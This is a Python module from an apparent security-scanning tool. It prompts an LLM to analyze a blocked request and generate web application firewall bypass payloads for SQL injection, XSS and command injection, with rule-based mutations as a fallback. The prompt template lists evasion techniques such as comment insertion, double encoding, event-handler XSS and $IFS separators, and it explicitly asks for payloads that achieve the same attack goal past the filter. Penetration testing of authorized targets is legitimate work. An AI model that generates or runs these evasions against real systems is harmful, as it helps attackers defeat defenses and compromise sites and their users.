"""Smart Payload Generator - AI-driven payload mutation for WAF bypass.

When static payloads fail but AI suspects a vulnerability (30-50% confidence),
this generator uses LLM to analyze filter rules and generate bypass payloads.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

from trix.plugins.vulns import PayloadContext, PayloadSpec

logger = logging.getLogger(__name__)


# Confidence thresholds for AI payload generation
CONFIDENCE_AI_TRIGGER_LOW = 0.30   # Minimum confidence to trigger
CONFIDENCE_AI_TRIGGER_HIGH = 0.50  # Maximum confidence (above this, already suspicious)


@dataclass
class WAFAnalysisContext:
    """Context for WAF/filter analysis."""
    
    vuln_type: str
    original_payload: str
    raw_request: str
    raw_response: str
    error_message: str = ""
    
    # Detection context
    waf_detected: bool = False
    waf_type: str = ""
    status_code: int = 0
    blocked_patterns: list[str] = field(default_factory=list)
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "vuln_type": self.vuln_type,
            "original_payload": self.original_payload,
            "error_message": self.error_message,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "status_code": self.status_code,
            "blocked_patterns": self.blocked_patterns,
        }


BYPASS_PROMPT_TEMPLATE = """You are a security researcher analyzing a WAF/filter rule.

## Context
- **Vulnerability Type**: {vuln_type}
- **Original Payload**: `{original_payload}`
- **HTTP Status Code**: {status_code}
- **WAF Detected**: {waf_detected} {waf_type}

## Response (truncated)
```
{response_snippet}
```

## Error/Block Message
{error_message}

## Task
The original payload was blocked or filtered. Analyze the filter rules and generate **3 bypass payloads** that:
1. Achieve the same attack goal
2. Use encoding, case variation, or syntax alternatives to bypass the filter
3. Are realistic and likely to work

## Common Bypass Techniques by Type

### SQL Injection
- Case variation: `SeLeCt`, `sElEcT`
- Comment insertion: `SEL/**/ECT`, `SE%00LECT`
- MySQL version comments: `/*!50000SELECT*/`
- Unicode: `&#x53;ELECT`
- Double encoding: `%2553ELECT`

### XSS
- Event handlers: `onerror`, `onload`, `onfocus`
- Case variation: `<ScRiPt>`, `<SCRIPT>`
- Encoding: `&lt;script&gt;`, `\\x3cscript\\x3e`
- SVG/IMG tags: `<svg onload=...>`, `<img src=x onerror=...>`

### Command Injection
- Separator alternatives: `|`, `||`, `&`, `&&`, `;`, `\\n`
- Encoding: `$IFS`, `${{IFS}}`
- Quotes: `c""at`, `c''at`

## Output Format
Return ONLY a JSON array with 3 objects:
```json
[
  {{
    "payload": "bypass payload here",
    "technique": "technique used",
    "description": "why this might bypass the filter"
  }}
]
```
"""


class SmartPayloadGenerator:
    """AI-driven payload generator for WAF/filter bypass.
    
    Uses LLM to analyze blocked payloads and generate bypass mutations.
    
    Example:
        generator = SmartPayloadGenerator(llm_client)
        context = WAFAnalysisContext(
            vuln_type="sqli",
            original_payload="' OR 1=1--",
            raw_response="...<blocked>..."
        )
        payloads = await generator.generate_bypass_payloads(context)
    """
    
    def __init__(self, llm_client: Any = None):
        """Initialize generator.
        
        Args:
            llm_client: LLM client instance (lazy-loaded if None)
        """
        self._llm = llm_client
        self._cache: dict[str, list[PayloadSpec]] = {}  # Cache by payload hash
    
    async def generate_bypass_payloads(
        self,
        context: WAFAnalysisContext,
        max_payloads: int = 3,
    ) -> list[PayloadSpec]:
        """Generate bypass payloads using LLM.
        
        Args:
            context: WAF analysis context with blocked payload info
            max_payloads: Maximum payloads to generate
            
        Returns:
            List of PayloadSpec objects with bypass payloads
        """
        # Check cache first
        cache_key = f"{context.vuln_type}:{context.original_payload}:{context.status_code}"
        if cache_key in self._cache:
            logger.debug(f"[SmartPayload] Cache hit for {cache_key[:50]}")
            return self._cache[cache_key]
        
        logger.info(
            f"[SmartPayload] Generating bypass payloads for {context.vuln_type} "
            f"(original: {context.original_payload[:30]}...)"
        )
        
        # Prepare prompt
        response_snippet = context.raw_response[:1500] if context.raw_response else ""
        prompt = BYPASS_PROMPT_TEMPLATE.format(
            vuln_type=context.vuln_type,
            original_payload=context.original_payload,
            status_code=context.status_code,
            waf_detected="Yes" if context.waf_detected else "No",
            waf_type=f"({context.waf_type})" if context.waf_type else "",
            response_snippet=response_snippet,
            error_message=context.error_message or "(no specific error message)",
        )
        
        try:
            payloads = await self._call_llm_for_payloads(prompt, context, max_payloads)
            self._cache[cache_key] = payloads
            return payloads
            
        except Exception as e:
            logger.error(f"[SmartPayload] LLM generation failed: {e}")
            return self._generate_fallback_payloads(context)
    
    async def _call_llm_for_payloads(
        self,
        prompt: str,
        context: WAFAnalysisContext,
        max_payloads: int,
    ) -> list[PayloadSpec]:
        """Call LLM to generate payloads."""
        import json
        
        # Lazy-load LLM if needed
        if self._llm is None:
            from trix.llm.llm import LLM
            from trix.llm.config import LLMConfig
            self._llm = LLM(LLMConfig(), agent_name=None)
        
        # Call LLM
        response = await self._llm.generate(
            conversation_history=[{"role": "user", "content": prompt}]
        )
        
        # Parse response
        content = response.content.strip()
        
        # Extract JSON array from response
        start = content.find('[')
        end = content.rfind(']') + 1
        if start == -1 or end == 0:
            logger.warning("[SmartPayload] No JSON array in response")
            return []
        
        json_str = content[start:end]
        bypass_list = json.loads(json_str)
        
        # Convert to PayloadSpec
        payloads = []
        for item in bypass_list[:max_payloads]:
            if isinstance(item, dict) and "payload" in item:
                payloads.append(PayloadSpec(
                    payload=item["payload"],
                    description=f"AI-generated bypass: {item.get('technique', 'unknown')}",
                    expected_behavior=f"Bypass filter for {context.vuln_type} detection",
                    category="ai_bypass",
                    severity="medium",
                ))
        
        logger.info(f"[SmartPayload] Generated {len(payloads)} bypass payloads")
        return payloads
    
    def _generate_fallback_payloads(
        self,
        context: WAFAnalysisContext,
    ) -> list[PayloadSpec]:
        """Generate rule-based fallback payloads when LLM fails."""
        original = context.original_payload
        payloads = []
        
        if context.vuln_type == "sqli":
            # SQL injection fallbacks
            mutations = [
                original.replace("SELECT", "SeLeCt").replace("select", "SeLeCt"),
                original.replace("OR", "||").replace("AND", "&&"),
                original.replace("'", "%27").replace('"', "%22"),
            ]
        elif context.vuln_type == "xss":
            # XSS fallbacks
            mutations = [
                original.replace("<", "%3C").replace(">", "%3E"),
                original.replace("script", "ScRiPt"),
                original.replace("alert", "prompt"),
            ]
        else:
            # Generic URL encoding
            mutations = [
                original.replace(" ", "%20"),
                original.replace("'", "%27"),
                original.replace('"', "%22"),
            ]
        
        for i, mutation in enumerate(mutations[:3]):
            if mutation != original:
                payloads.append(PayloadSpec(
                    payload=mutation,
                    description=f"Fallback mutation #{i+1}",
                    expected_behavior=f"Bypass filter for {context.vuln_type}",
                    category="fallback_bypass",
                ))
        
        return payloads
    
    def should_trigger(self, confidence_score: float) -> bool:
        """Check if AI payload generation should be triggered.
        
        Triggers when confidence is in the "uncertain low" zone (30-50%),
        suggesting a possible vulnerability but blocked by WAF.
        """
        return CONFIDENCE_AI_TRIGGER_LOW <= confidence_score < CONFIDENCE_AI_TRIGGER_HIGH


# Global instance
_smart_generator: SmartPayloadGenerator | None = None


def get_smart_generator() -> SmartPayloadGenerator:
    """Get the global smart payload generator."""
    global _smart_generator
    if _smart_generator is None:
        _smart_generator = SmartPayloadGenerator()
    return _smart_generator
